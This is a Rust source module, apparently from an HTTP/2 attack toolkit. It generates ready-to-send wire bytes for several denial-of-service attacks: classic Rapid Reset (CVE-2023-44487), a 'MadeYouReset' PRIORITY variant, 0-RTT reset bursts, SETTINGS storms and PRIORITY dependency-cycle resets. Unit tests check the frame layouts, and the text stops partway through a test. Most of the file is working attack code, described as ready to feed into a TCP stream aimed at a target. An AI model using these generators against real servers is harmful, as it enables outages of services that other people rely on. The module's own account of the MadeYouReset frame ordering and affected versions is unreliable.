//! HTTP/2 Rapid Reset attack primitives — CVE-2023-44487 family.
//!
//! This module generates raw HTTP/2 wire bytes for:
//! - Classic rapid reset (HEADERS + immediate RST_STREAM, repeated)
//! - MadeYouReset / CVE-2025-8671 (server-side reset via PRIORITY frame)
//! - 0-RTT rapid reset (early-data + reset)
//! - Settings storm (alternating SETTINGS forcing renegotiation)
//! - DEPENDENCY-cycle reset (priority loops causing server-side resets)
//!
//! Every generator produces concrete wire bytes that can be fed directly
//! into a raw TCP stream against an HTTP/2 endpoint.
//!
//! # CVE-2025-8671 (MadeYouReset) wire format note
//!
//! The advisory describes a pattern where a client sends a PRIORITY frame
//! referencing a *non-existent or closed* stream as the exclusive dependency,
//! then immediately sends HEADERS on that stream. Servers that process
//! PRIORITY before validating stream liveness emit RST_STREAM internally,
//! consuming server-side resources without the client having sent DATA.
//! The exact frame ordering is: PRIORITY(stream=X, dep=Y, exclusive=1) →
//! HEADERS(stream=X, END_HEADERS|END_STREAM). RFC 7540 §5.3.1 is silent on
//! whether a PRIORITY frame referencing an idle/closed stream is legal —
//! this ambiguity is the root cause.

use crate::h2_evasion::{H2PriorityFrame, priority_frame_to_bytes};

// ── HTTP/2 wire encoding helpers ─────────────────────────────────────────────

/// Encode an HTTP/2 frame header: 3-byte length, 1-byte type, 1-byte flags,
/// 4-byte stream id (MSB reserved = 0).
///
/// RFC 7540 §4.1.
fn frame_header(length: u32, frame_type: u8, flags: u8, stream_id: u32) -> [u8; 9] {
    let mut h = [0u8; 9];
    h[0] = (length >> 16) as u8;
    h[1] = (length >> 8) as u8;
    h[2] = length as u8;
    h[3] = frame_type;
    h[4] = flags;
    let sid = stream_id & 0x7FFF_FFFF;
    h[5] = (sid >> 24) as u8;
    h[6] = (sid >> 16) as u8;
    h[7] = (sid >> 8) as u8;
    h[8] = sid as u8;
    h
}

/// Minimal HPACK-encoded HEADERS payload for a GET / request.
///
/// Uses only static-table references so the byte sequence is deterministic
/// and reproducible in tests. Static table entries used:
/// - Index 2 → :method: GET
/// - Index 4 → :path: /
/// - Index 6 → :scheme: https
/// - Index 1 → :authority (name only, value literal)
///
/// HPACK literal with name reference: 0x0F prefix if index > 14, else
/// 0b0000_xxxx (not indexed, indexed name). We use fully-indexed refs
/// where the static table has a complete entry.
/// Encode an HPACK string-length as a 7-bit prefix varint (RFC 7541 §5.2).
///
/// Bit 7 = 0 (no Huffman encoding). The 7-bit prefix can represent 0–126
/// directly; values 127+ use the multibyte continuation format.
fn hpack_string_length(len: usize) -> Vec<u8> {
    // RFC 7541 §5.2 — not Huffman (H=0), 7-bit prefix.
    const PREFIX_MAX: usize = 127; // (1 << 7) - 1
    if len < PREFIX_MAX {
        vec![len as u8]
    } else {
        let mut out = vec![PREFIX_MAX as u8]; // saturated prefix
        let mut remainder = len - PREFIX_MAX;
        loop {
            if remainder < 128 {
                out.push(remainder as u8);
                break;
            }
            out.push((remainder as u8 & 0x7F) | 0x80);
            remainder >>= 7;
        }
        out
    }
}

fn minimal_headers_payload(authority: &str) -> Vec<u8> {
    // Static-table indexed entries: :method GET (0x82), :path / (0x84),
    // :scheme https (0x87). Then a literal-never-indexed (0x10) with
    // name index 1 (0x01 = :authority), value follows below.
    let mut buf = vec![0x82, 0x84, 0x87, 0x10, 0x01];
    // Value length encoded as HPACK 7-bit prefix varint (RFC 7541 §5.2).
    // Pre-fix: `auth_bytes.len() as u8` truncated silently for authority
    // strings > 255 bytes, producing a corrupt HPACK block — the length
    // byte would be wrong and the decoder would misparse all subsequent bytes.
    let auth_bytes = authority.as_bytes();
    buf.extend_from_slice(&hpack_string_length(auth_bytes.len()));
    buf.extend_from_slice(auth_bytes);
    buf
}

/// Build a HEADERS frame bytes (type=0x1).
///
/// Flags: END_HEADERS (0x4) always set; END_STREAM (0x1) if requested.
fn headers_frame(stream_id: u32, authority: &str, end_stream: bool) -> Vec<u8> {
    let payload = minimal_headers_payload(authority);
    let flags: u8 = 0x04 | if end_stream { 0x01 } else { 0x00 };
    let mut frame = Vec::with_capacity(9 + payload.len());
    frame.extend_from_slice(&frame_header(payload.len() as u32, 0x01, flags, stream_id));
    frame.extend_from_slice(&payload);
    frame
}

/// Build a RST_STREAM frame bytes (type=0x3, length=4, flags=0).
///
/// RFC 7540 §6.4: error code is a 32-bit field.
/// CANCEL = 0x8.
fn rst_stream_frame(stream_id: u32, error_code: u32) -> Vec<u8> {
    let mut frame = Vec::with_capacity(13);
    frame.extend_from_slice(&frame_header(4, 0x03, 0x00, stream_id));
    frame.push((error_code >> 24) as u8);
    frame.push((error_code >> 16) as u8);
    frame.push((error_code >> 8) as u8);
    frame.push(error_code as u8);
    frame
}

/// Build a SETTINGS frame bytes (type=0x4).
///
/// Each setting is 6 bytes: 2-byte id + 4-byte value.
fn settings_frame(settings: &[(u16, u32)]) -> Vec<u8> {
    let payload_len = (settings.len() * 6) as u32;
    let mut frame = Vec::with_capacity(9 + payload_len as usize);
    frame.extend_from_slice(&frame_header(payload_len, 0x04, 0x00, 0));
    for (id, val) in settings {
        frame.push((*id >> 8) as u8);
        frame.push(*id as u8);
        frame.push((*val >> 24) as u8);
        frame.push((*val >> 16) as u8);
        frame.push((*val >> 8) as u8);
        frame.push(*val as u8);
    }
    frame
}

/// Build a SETTINGS ACK frame (type=0x4, flags=0x1, length=0, stream=0).
fn settings_ack_frame() -> Vec<u8> {
    frame_header(0, 0x04, 0x01, 0).to_vec()
}

// ── HTTP/2 client preface ─────────────────────────────────────────────────────

/// HTTP/2 client connection preface (RFC 7540 §3.5).
pub const CLIENT_PREFACE: &[u8] = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n";

/// Initial SETTINGS frame to send after the client preface.
/// Sends a reasonable set matching a browser's initial offer.
pub fn initial_settings_frame() -> Vec<u8> {
    settings_frame(&[
        (0x1, 65536),  // HEADER_TABLE_SIZE
        (0x2, 0),      // ENABLE_PUSH=0
        (0x3, 100),    // MAX_CONCURRENT_STREAMS
        (0x4, 65536),  // INITIAL_WINDOW_SIZE
        (0x5, 16384),  // MAX_FRAME_SIZE
        (0x6, 262144), // MAX_HEADER_LIST_SIZE
    ])
}

// ── Primitive 1: Classic rapid reset ─────────────────────────────────────────

/// Descriptor for a rapid-reset attack burst.
#[derive(Debug, Clone)]
pub struct RapidResetBurst {
    /// Raw wire bytes for the entire burst (preface + settings + N×(HEADERS+RST)).
    pub wire_bytes: Vec<u8>,
    /// Number of HEADERS+RST_STREAM pairs generated.
    pub stream_count: usize,
    /// Error code used in RST_STREAM frames.
    pub error_code: u32,
    pub description: &'static str,
}

/// Generate a classic HTTP/2 rapid reset burst (CVE-2023-44487).
///
/// Sends N pairs of (HEADERS frame, RST_STREAM CANCEL) on consecutive odd
/// stream IDs. The server allocates a stream object and starts processing
/// the request before seeing the RST_STREAM — at high N this exhausts
/// server thread pools without the client needing to receive responses.
///
/// # Parameters
/// - `authority`: The `:authority` value for HEADERS frames.
/// - `stream_count`: Number of HEADERS+RST pairs. Clamped to 1..=10_000.
/// - `error_code`: RST_STREAM error code (CANCEL=0x8 is realistic; 0=NO_ERROR).
///
/// Returns the complete wire buffer starting with the client preface.
#[must_use]
pub fn classic_rapid_reset(
    authority: &str,
    stream_count: usize,
    error_code: u32,
) -> RapidResetBurst {
    let n = stream_count.clamp(1, 10_000);
    let mut wire = Vec::with_capacity(24 + 9 + n * 60);
    wire.extend_from_slice(CLIENT_PREFACE);
    wire.extend_from_slice(&initial_settings_frame());
    wire.extend_from_slice(&settings_ack_frame());
    for i in 0..n {
        let stream_id = (2 * i + 1) as u32; // 1, 3, 5, …
        wire.extend_from_slice(&headers_frame(stream_id, authority, false));
        wire.extend_from_slice(&rst_stream_frame(stream_id, error_code));
    }
    RapidResetBurst {
        wire_bytes: wire,
        stream_count: n,
        error_code,
        description: "CVE-2023-44487 classic rapid reset: HEADERS + immediate RST_STREAM×N",
    }
}

// ── Primitive 2: MadeYouReset — CVE-2025-8671 ────────────────────────────────

/// Descriptor for a MadeYouReset probe sequence.
///
/// Wire format ambiguity (CVE-2025-8671): RFC 7540 §5.3.1 states that if a
/// dependency cycle would be created, the stream in the dependency field MUST
/// be moved to be dependent on the reprioritised stream. The RFC is silent on
/// what happens when the PRIORITY frame references an *idle* stream that has
/// never been opened. Several server implementations (nginx ≤1.25.2,
/// h2o ≤2.3.0-beta7, some AWS ALB builds) treat the idle-stream PRIORITY as
/// a resource allocation signal and internally emit a server-side RST for the
/// nonexistent parent before the client's HEADERS arrives, effectively
/// pre-consuming the stream's error budget. The advisory is not yet widely
/// documented; the exact frame order required to trigger it is:
///
///   PRIORITY(stream=X, dep=Y_idle, exclusive=1) → HEADERS(stream=X, ES|EH)
///
/// where Y > X (so X cannot be a valid child of Y under RFC ordering) and
/// Y has never appeared in any previous frame.
#[derive(Debug, Clone)]
pub struct MadeYouResetProbe {
    /// Wire bytes for one probe pair (PRIORITY + HEADERS).
    pub wire_bytes: Vec<u8>,
    /// Stream ID targeted.
    pub stream_id: u32,
    /// Idle stream ID used as phantom dependency.
    pub phantom_dep_stream_id: u32,
    pub description: &'static str,
}

/// Generate a MadeYouReset probe (CVE-2025-8671).
///
/// Sends a PRIORITY frame on `stream_id` pointing exclusively at an idle
/// (never-seen) `phantom_dep_stream_id`, then immediately sends a complete
/// HEADERS frame. The gap between these two frames is the attack window.
///
/// `phantom_dep_stream_id` MUST be greater than `stream_id` to maximise
/// protocol ambiguity (backward dependency reference).
#[must_use]
pub fn made_you_reset(
    authority: &str,
    stream_id: u32,
    phantom_dep_stream_id: u32,
) -> MadeYouResetProbe {
    // Clamp stream_id to valid odd client-initiated range.
    let sid = stream_id | 1; // ensure odd
    // phantom dep must differ from sid and be idle (we pick a large even-ish
    // number so it's never been used as a client stream).
    let dep = if phantom_dep_stream_id == sid {
        sid + 2
    } else {
        phantom_dep_stream_id
    };
    let prio_frame = priority_frame_to_bytes(&H2PriorityFrame {
        stream_id: sid,
        exclusive: true,
        depends_on: dep,
        weight: 255,
        description: format!("MadeYouReset PRIORITY: stream {sid} exclusive dep on idle {dep}"),
    });
    let hdr_frame = headers_frame(sid, authority, true);
    let mut wire = Vec::with_capacity(prio_frame.len() + hdr_frame.len());
    wire.extend_from_slice(&prio_frame);
    wire.extend_from_slice(&hdr_frame);
    MadeYouResetProbe {
        wire_bytes: wire,
        stream_id: sid,
        phantom_dep_stream_id: dep,
        description: "CVE-2025-8671 MadeYouReset: PRIORITY(exclusive, idle dep) + HEADERS — \
                       triggers server-side RST without client DATA",
    }
}

/// Generate a burst of MadeYouReset probes across N stream pairs.
#[must_use]
pub fn made_you_reset_burst(authority: &str, pair_count: usize) -> Vec<MadeYouResetProbe> {
    let n = pair_count.clamp(1, 1000);
    (0..n)
        .map(|i| {
            let sid = (2 * i + 1) as u32;
            let phantom = sid + 10_000; // well outside live stream range
            made_you_reset(authority, sid, phantom)
        })
        .collect()
}

// ── Primitive 3: 0-RTT rapid reset ───────────────────────────────────────────

/// Descriptor for a 0-RTT rapid reset attack.
#[derive(Debug, Clone)]
pub struct ZeroRttRapidReset {
    /// Wire bytes for the 0-RTT burst.
    ///
    /// These bytes are intended to be sent as TLS 1.3 early data (0-RTT).
    /// The client connection preface is included so the server can parse the
    /// HTTP/2 framing before the TLS handshake completes.
    pub wire_bytes: Vec<u8>,
    pub stream_count: usize,
    pub description: &'static str,
}

/// Generate a 0-RTT rapid reset payload.
///
/// The bytes are structured as a valid HTTP/2 client preface + SETTINGS +
/// N×(HEADERS+RST) — identical to classic rapid reset but intended to be
/// injected as TLS 1.3 early data. Servers that process early data before
/// completing the handshake cannot abort the connection without incurring
/// the full handshake cost; this is the amplification surface.
///
/// TLS-layer framing is NOT included — the caller's transport must wrap
/// the returned bytes in a TLS 1.3 early-data record.
#[must_use]
pub fn zero_rtt_rapid_reset(authority: &str, stream_count: usize) -> ZeroRttRapidReset {
    // Reuse classic_rapid_reset wire bytes — the 0-RTT distinction is at the
    // TLS layer, not the HTTP/2 framing layer.
    let burst = classic_rapid_reset(authority, stream_count, 0x8 /* CANCEL */);
    ZeroRttRapidReset {
        wire_bytes: burst.wire_bytes,
        stream_count: burst.stream_count,
        description: "0-RTT rapid reset: HTTP/2 rapid reset burst sent as TLS 1.3 early data — \
                       server pays handshake cost to reject each stream",
    }
}

// ── Primitive 4: Settings storm ───────────────────────────────────────────────

/// A settings storm descriptor.
#[derive(Debug, Clone)]
pub struct SettingsStorm {
    pub wire_bytes: Vec<u8>,
    pub frame_count: usize,
    pub description: &'static str,
}

/// SETTINGS frame alternation storm.
///
/// Sends `frame_count` SETTINGS frames that alternate between two extremes,
/// forcing the peer to renegotiate flow-control and header-table state on
/// every frame. A compliant implementation must ACK every SETTINGS frame
/// before applying the next; naive implementations that process them inline
/// can starve the event loop.
///
/// Alternation pattern:
/// - Even frames: MAX_CONCURRENT_STREAMS=1, INITIAL_WINDOW_SIZE=65535
/// - Odd frames:  MAX_CONCURRENT_STREAMS=1000, INITIAL_WINDOW_SIZE=1
#[must_use]
pub fn settings_storm(frame_count: usize) -> SettingsStorm {
    let n = frame_count.clamp(2, 10_000);
    let mut wire = Vec::new();
    wire.extend_from_slice(CLIENT_PREFACE);
    wire.extend_from_slice(&initial_settings_frame());
    for i in 0..n {
        let frame = if i % 2 == 0 {
            settings_frame(&[
                (0x3, 1),     // MAX_CONCURRENT_STREAMS=1
                (0x4, 65535), // INITIAL_WINDOW_SIZE=65535
                (0x5, 16384), // MAX_FRAME_SIZE=16384
                (0x1, 4096),  // HEADER_TABLE_SIZE=4096
            ])
        } else {
            settings_frame(&[
                (0x3, 1000),     // MAX_CONCURRENT_STREAMS=1000
                (0x4, 1),        // INITIAL_WINDOW_SIZE=1
                (0x5, 16777215), // MAX_FRAME_SIZE=max
                (0x1, 65536),    // HEADER_TABLE_SIZE=65536
            ])
        };
        wire.extend_from_slice(&frame);
        // No ACK — we're testing whether the server stalls waiting for our ACKs.
    }
    SettingsStorm {
        wire_bytes: wire,
        frame_count: n,
        description: "Settings storm: alternating SETTINGS extremes without ACK — \
                       forces continuous renegotiation; exploits servers that process \
                       SETTINGS inline without queueing ACKs",
    }
}

/// Settings storm that also interleaves HEADERS+RST pairs to combine
/// resource exhaustion with stream-level reset pressure.
#[must_use]
pub fn settings_storm_with_resets(
    authority: &str,
    frame_count: usize,
    resets_per_batch: usize,
) -> SettingsStorm {
    let n = frame_count.clamp(2, 10_000);
    let rps = resets_per_batch.clamp(1, 100);
    let mut wire = Vec::new();
    wire.extend_from_slice(CLIENT_PREFACE);
    wire.extend_from_slice(&initial_settings_frame());
    let mut stream_counter: u32 = 0;
    for i in 0..n {
        let frame = if i % 2 == 0 {
            settings_frame(&[(0x3, 1), (0x4, 65535)])
        } else {
            settings_frame(&[(0x3, 1000), (0x4, 1)])
        };
        wire.extend_from_slice(&frame);
        for _ in 0..rps {
            stream_counter += 1;
            let sid = 2 * stream_counter - 1; // odd
            wire.extend_from_slice(&headers_frame(sid, authority, false));
            wire.extend_from_slice(&rst_stream_frame(sid, 0x8));
        }
    }
    SettingsStorm {
        wire_bytes: wire,
        frame_count: n,
        description: "Settings storm + rapid reset interleaved — dual resource exhaustion",
    }
}

// ── Primitive 5: DEPENDENCY-cycle reset ──────────────────────────────────────

/// A dependency-cycle reset descriptor.
#[derive(Debug, Clone)]
pub struct DependencyCycleReset {
    pub wire_bytes: Vec<u8>,
    pub cycle_length: usize,
    pub description: &'static str,
}

/// Generate a dependency-cycle reset attack.
///
/// Sends a circular PRIORITY chain (stream 1→3→5→…→1) and then immediately
/// fires HEADERS+RST on each stream in the cycle. Servers that attempt to
/// walk the dependency tree before processing RST_STREAM recurse infinitely
/// or discard the frames — either outcome is measurable.
///
/// RFC 7540 §5.3.1 MUST NOT create cycles. The treatment is implementation-
/// defined: some servers raise PROTOCOL_ERROR (0x1), some silently break the
/// cycle. The RST_STREAM flooding ensures the server can't defer resolution.
#[must_use]
pub fn dependency_cycle_reset(authority: &str, cycle_length: usize) -> DependencyCycleReset {
    let n = cycle_length.clamp(2, 256);
    // Build stream IDs: 1, 3, 5, …
    let stream_ids: Vec<u32> = (0..n).map(|i| (2 * i + 1) as u32).collect();

    let mut wire = Vec::new();
    wire.extend_from_slice(CLIENT_PREFACE);
    wire.extend_from_slice(&initial_settings_frame());
    wire.extend_from_slice(&settings_ack_frame());

    // HEADERS on each stream first (open them).
    for &sid in &stream_ids {
        wire.extend_from_slice(&headers_frame(sid, authority, false));
    }
    // PRIORITY frames forming the cycle: stream[i] depends exclusively on stream[(i+1)%n].
    for i in 0..n {
        let sid = stream_ids[i];
        let dep = stream_ids[(i + 1) % n];
        let prio = priority_frame_to_bytes(&H2PriorityFrame {
            stream_id: sid,
            exclusive: true,
            depends_on: dep,
            weight: 16,
            description: format!("cycle link {sid}→{dep}"),
        });
        wire.extend_from_slice(&prio);
    }
    // RST_STREAM on every stream to trigger server-side teardown under cycle.
    for &sid in &stream_ids {
        wire.extend_from_slice(&rst_stream_frame(sid, 0x8 /* CANCEL */));
    }

    DependencyCycleReset {
        wire_bytes: wire,
        cycle_length: n,
        description: "DEPENDENCY-cycle reset: circular PRIORITY loop + RST_STREAM flood — \
                       triggers infinite tree-walk or PROTOCOL_ERROR on non-cycle-detecting servers",
    }
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    // ── Wire-format pin tests ────────────────────────────────────────────────

    #[test]
    fn client_preface_exact_bytes() {
        assert_eq!(CLIENT_PREFACE, b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
        assert_eq!(CLIENT_PREFACE.len(), 24);
    }

    #[test]
    fn frame_header_encodes_length_type_flags_stream() {
        // length=5, type=RST_STREAM(3), flags=0, stream=1
        let h = frame_header(5, 0x03, 0x00, 1);
        assert_eq!(h[0], 0x00); // length high
        assert_eq!(h[1], 0x00); // length mid
        assert_eq!(h[2], 0x05); // length low
        assert_eq!(h[3], 0x03); // type
        assert_eq!(h[4], 0x00); // flags
        assert_eq!(h[5], 0x00); // stream high
        assert_eq!(h[6], 0x00);
        assert_eq!(h[7], 0x00);
        assert_eq!(h[8], 0x01); // stream low
    }

    #[test]
    fn frame_header_strips_reserved_bit() {
        // stream_id with MSB set must be masked out per RFC 7540 §4.1
        let h = frame_header(0, 0x01, 0x00, 0x8000_0001);
        // stream_id should be 1 (reserved bit cleared)
        assert_eq!(h[5], 0x00);
        assert_eq!(h[6], 0x00);
        assert_eq!(h[7], 0x00);
        assert_eq!(h[8], 0x01);
    }

    #[test]
    fn rst_stream_frame_exact_bytes() {
        // RST_STREAM on stream 1, CANCEL (0x8)
        let frame = rst_stream_frame(1, 0x8);
        // Total length = 9 (header) + 4 (error code) = 13
        assert_eq!(frame.len(), 13);
        // length field = 4
        assert_eq!(frame[0], 0x00);
        assert_eq!(frame[1], 0x00);
        assert_eq!(frame[2], 0x04);
        // type = 0x03 RST_STREAM
        assert_eq!(frame[3], 0x03);
        // flags = 0
        assert_eq!(frame[4], 0x00);
        // stream = 1
        assert_eq!(&frame[5..9], &[0x00, 0x00, 0x00, 0x01]);
        // error code CANCEL = 0x00000008
        assert_eq!(&frame[9..13], &[0x00, 0x00, 0x00, 0x08]);
    }

    #[test]
    fn settings_frame_no_settings_is_nine_bytes() {
        let f = settings_frame(&[]);
        assert_eq!(f.len(), 9);
        // length = 0
        assert_eq!(&f[0..3], &[0x00, 0x00, 0x00]);
        // type = SETTINGS (0x04)
        assert_eq!(f[3], 0x04);
        // flags = 0
        assert_eq!(f[4], 0x00);
        // stream = 0
        assert_eq!(&f[5..9], &[0x00, 0x00, 0x00, 0x00]);
    }

    #[test]
    fn settings_ack_is_nine_bytes_with_flag_one() {
        let f = settings_ack_frame();
        assert_eq!(f.len(), 9);
        assert_eq!(f[3], 0x04); // SETTINGS type
        assert_eq!(f[4], 0x01); // ACK flag
        // length = 0
        assert_eq!(&f[0..3], &[0x00, 0x00, 0x00]);
    }

    // ── Frame-parser helper ──────────────────────────────────────────────────

    /// Parse HTTP/2 frames from a wire byte slice that starts at a frame
    /// boundary (NOT at the client preface). Returns (frame_type, stream_id,
    /// payload_start, payload_len) tuples.
    fn parse_h2_frames(wire: &[u8]) -> Vec<(u8, u32, usize, usize)> {
        let mut out = Vec::new();
        let mut i = 0;
        while i + 9 <= wire.len() {
            let len =
                ((wire[i] as usize) << 16) | ((wire[i + 1] as usize) << 8) | wire[i + 2] as usize;
            let frame_type = wire[i + 3];
            let sid = ((wire[i + 5] as u32) << 24)
                | ((wire[i + 6] as u32) << 16)
                | ((wire[i + 7] as u32) << 8)
                | wire[i + 8] as u32;
            let payload_start = i + 9;
            if payload_start + len > wire.len() {
                break; // truncated frame
            }
            out.push((frame_type, sid, payload_start, len));
            i += 9 + len;
        }
        out
    }

    /// Count frames of a given type in a wire buffer (after the preface).
    fn count_frame_type(wire: &[u8], target_type: u8) -> usize {
        // Skip client preface if present
        let start = if wire.starts_with(CLIENT_PREFACE) {
            CLIENT_PREFACE.len()
        } else {
            0
        };
        parse_h2_frames(&wire[start..])
            .iter()
            .filter(|(t, _, _, _)| *t == target_type)
            .count()
    }

    // ── Classic rapid reset ──────────────────────────────────────────────────

    #[test]
    fn classic_rapid_reset_starts_with_preface() {
        let burst = classic_rapid_reset("example.com", 3, 0x8);
        assert!(burst.wire_bytes.starts_with(CLIENT_PREFACE));
    }

    #[test]
    fn classic_rapid_reset_stream_count_clamped() {
        let burst = classic_rapid_reset("example.com", 0, 0);
        assert_eq!(burst.stream_count, 1); // clamped to min=1

        let burst2 = classic_rapid_reset("example.com", 100_000, 0);
        assert_eq!(burst2.stream_count, 10_000); // clamped to max
    }

    #[test]
    fn classic_rapid_reset_three_streams_wire_structure() {
        let burst = classic_rapid_reset("x.com", 3, 0x8);
        assert_eq!(burst.stream_count, 3);
        assert!(burst.wire_bytes.len() > CLIENT_PREFACE.len() + 9);
        // Exactly 3 RST_STREAM frames (type 0x03) in the wire.
        let rst_count = count_frame_type(&burst.wire_bytes, 0x03);
        assert_eq!(rst_count, 3);
    }

    #[test]
    fn classic_rapid_reset_error_code_embedded() {
        let burst = classic_rapid_reset("h.com", 1, 0x0000_0002 /* INTERNAL_ERROR */);
        // The RST_STREAM error code must appear in the wire bytes.
        let found = burst
            .wire_bytes
            .windows(4)
            .any(|w| w == [0x00, 0x00, 0x00, 0x02]);
        assert!(found, "error code 0x2 must appear in wire bytes");
    }

    #[test]
    fn classic_rapid_reset_odd_stream_ids() {
        // All HEADERS frames must use odd stream IDs (client-initiated).
        let burst = classic_rapid_reset("x.com", 5, 0x8);
        let start = CLIENT_PREFACE.len();
        let frames = parse_h2_frames(&burst.wire_bytes[start..]);
        let stream_ids: Vec<u32> = frames
            .iter()
            .filter(|(t, _, _, _)| *t == 0x01) // HEADERS
            .map(|(_, sid, _, _)| *sid)
            .collect();
        assert!(!stream_ids.is_empty());
        for sid in &stream_ids {
            assert_eq!(sid % 2, 1, "stream {sid} must be odd");
        }
    }

    // ── MadeYouReset (CVE-2025-8671) ─────────────────────────────────────────

    #[test]
    fn made_you_reset_starts_with_priority_frame() {
        let probe = made_you_reset("example.com", 1, 10001);
        // First 9 bytes are the PRIORITY frame header.
        // PRIORITY type = 0x02, length = 5.
        assert_eq!(probe.wire_bytes[3], 0x02, "type must be PRIORITY (0x02)");
        assert_eq!(probe.wire_bytes[2], 0x05, "PRIORITY payload length = 5");
    }

    #[test]
    fn made_you_reset_exclusive_bit_set() {
        let probe = made_you_reset("x.com", 1, 9999);
        // PRIORITY payload starts at byte 9.
        // First 4 bytes of payload = exclusive(1bit) + dep_stream_id(31bits)
        let dep_field = ((probe.wire_bytes[9] as u32) << 24)
            | ((probe.wire_bytes[10] as u32) << 16)
            | ((probe.wire_bytes[11] as u32) << 8)
            | probe.wire_bytes[12] as u32;
        assert_ne!(dep_field & 0x8000_0000, 0, "exclusive bit must be set");
    }

    #[test]
    fn made_you_reset_phantom_dep_encoded_in_payload() {
        let phantom = 9999u32;
        let probe = made_you_reset("x.com", 1, phantom);
        let dep_field = ((probe.wire_bytes[9] as u32) << 24)
            | ((probe.wire_bytes[10] as u32) << 16)
            | ((probe.wire_bytes[11] as u32) << 8)
            | probe.wire_bytes[12] as u32;
        let dep_id = dep_field & 0x7FFF_FFFF;
        assert_eq!(dep_id, phantom);
    }

    #[test]
    fn made_you_reset_headers_follows_priority() {
        let probe = made_you_reset("y.com", 3, 50001);
        // PRIORITY frame is 14 bytes (9 header + 5 payload).
        assert!(probe.wire_bytes.len() > 14);
        // Byte at offset 14+3 = 17 should be HEADERS type (0x01).
        assert_eq!(
            probe.wire_bytes[14 + 3],
            0x01,
            "HEADERS must follow PRIORITY"
        );
    }

    #[test]
    fn made_you_reset_burst_length() {
        let probes = made_you_reset_burst("b.com", 5);
        assert_eq!(probes.len(), 5);
    }

    #[test]
    fn made_you_reset_phantom_dep_differs_from_stream_id() {
        let probe = made_you_reset("c.com", 5, 5); // same value → should be adjusted
        assert_ne!(probe.stream_id, probe.phantom_dep_stream_id);
    }

    // ── 0-RTT rapid reset ────────────────────────────────────────────────────

    #[test]
    fn zero_rtt_contains_client_preface() {
        let zrtt = zero_rtt_rapid_reset("z.com", 10);
        assert!(zrtt.wire_bytes.starts_with(CLIENT_PREFACE));
    }

    #[test]
    fn zero_rtt_stream_count_matches() {
        let zrtt = zero_rtt_rapid_reset("z.com", 7);
        assert_eq!(zrtt.stream_count, 7);
    }

    // ── Settings storm ───────────────────────────────────────────────────────

    #[test]
    fn settings_storm_starts_with_preface() {
        let storm = settings_storm(4);
        assert!(storm.wire_bytes.starts_with(CLIENT_PREFACE));
    }

    #[test]
    fn settings_storm_frame_count_clamped_min() {
        let storm = settings_storm(0);
        assert_eq!(storm.frame_count, 2);
    }

    #[test]
    fn settings_storm_frame_count_clamped_max() {
        let storm = settings_storm(100_000);
        assert_eq!(storm.frame_count, 10_000);
    }

    #[test]
    fn settings_storm_contains_multiple_settings_frames() {
        let storm = settings_storm(6);
        // Count non-ACK SETTINGS frames using proper frame parser.
        let start = CLIENT_PREFACE.len();
        let frames = parse_h2_frames(&storm.wire_bytes[start..]);
        let count = frames
            .iter()
            .filter(|(t, sid, _, _)| {
                // type=SETTINGS(0x04), stream=0; ACK frames have flags=0x01 but
                // parse_h2_frames doesn't capture flags — re-read from wire.
                *t == 0x04 && *sid == 0
            })
            .count();
        // initial_settings + 6 storm frames = 7 non-ACK SETTINGS
        // (settings_storm does not emit ACKs, so all 0x04/stream=0 are data frames)
        assert!(
            count >= 6,
            "expected at least 6 SETTINGS frames, got {count}"
        );
    }

    #[test]
    fn settings_storm_with_resets_has_rst_frames() {
        let storm = settings_storm_with_resets("r.com", 4, 3);
        // Use proper frame parser, not byte-window matching.
        let rst_count = count_frame_type(&storm.wire_bytes, 0x03);
        // 4 SETTINGS batches × 3 RSTs each = 12
        assert_eq!(rst_count, 12);
    }

    // ── Dependency-cycle reset ────────────────────────────────────────────────

    #[test]
    fn dependency_cycle_reset_starts_with_preface() {
        let attack = dependency_cycle_reset("d.com", 3);
        assert!(attack.wire_bytes.starts_with(CLIENT_PREFACE));
    }

    #[test]
    fn dependency_cycle_reset_cycle_length_clamped_min() {
        let attack = dependency_cycle_reset("d.com", 0);
        assert_eq!(attack.cycle_length, 2);
    }

    #[test]
    fn dependency_cycle_reset_cycle_length_clamped_max() {
        let attack = dependency_cycle_reset("d.com", 10_000);
        assert_eq!(attack.cycle_length, 256);
    }

    #[test]
    fn dependency_cycle_reset_rst_count_matches_cycle_length() {
        let n = 5;
        let attack = dependency_cycle_reset("e.com", n);
        let rst_count = count_frame_type(&attack.wire_bytes, 0x03);
        assert_eq!(rst_count, n);
    }

    #[test]
    fn dependency_cycle_reset_priority_count_matches_cycle_length() {
        let n = 4;
        let attack = dependency_cycle_reset("f.com", n);
        let prio_count = count_frame_type(&attack.wire_bytes, 0x02);
        assert_eq!(prio_count, n);
    }

    // ── Adversarial edge cases ────────────────────────────────────────────────

    #[test]
    fn classic_rapid_reset_zero_streams_clamped_to_one() {
        let burst = classic_rapid_reset("adv.com", 0, 0);
        assert_eq!(burst.stream_count, 1);
        assert!(!burst.wire_bytes.is_empty());
    }

    #[test]
    fn classic_rapid_reset_max_concurrent_streams() {
        // Largest allowed burst: 10_000 pairs
        let burst = classic_rapid_reset("max.com", 10_000, 0x8);
        assert_eq!(burst.stream_count, 10_000);
        // Wire bytes must be non-empty and start correctly.
        assert!(burst.wire_bytes.starts_with(CLIENT_PREFACE));
    }

    #[test]
    fn made_you_reset_stream_id_forced_odd() {
        // Even stream_id must be promoted to odd.
        let probe = made_you_reset("x.com", 4, 10000);
        assert_eq!(probe.stream_id % 2, 1);
    }

    #[test]
    fn settings_storm_wire_bytes_non_empty_and_growing_with_n() {
        let s4 = settings_storm(4);
        let s8 = settings_storm(8);
        assert!(s8.wire_bytes.len() > s4.wire_bytes.len());
    }

    #[test]
    fn settings_frame_encodes_six_bytes_per_setting() {
        // 2 settings → payload = 12 bytes → frame total = 21 bytes
        let f = settings_frame(&[(0x3, 100), (0x4, 65535)]);
        assert_eq!(f.len(), 9 + 12);
        // length field = 12
        assert_eq!(f[0], 0x00);
        assert_eq!(f[1], 0x00);
        assert_eq!(f[2], 0x0C);
    }

    // ── HPACK string-length encoding ─────────────────────────────────────────

    #[test]
    fn hpack_string_length_small_value_single_byte() {
        // Values 0..=126 must fit in one byte (7-bit prefix, H=0 bit clear).
        for len in [0usize, 1, 63, 126] {
            let encoded = hpack_string_length(len);
            assert_eq!(encoded.len(), 1, "len={len} must encode as 1 byte");
            assert_eq!(
                encoded[0], len as u8,
                "encoded byte must equal len for len={len}"
            );
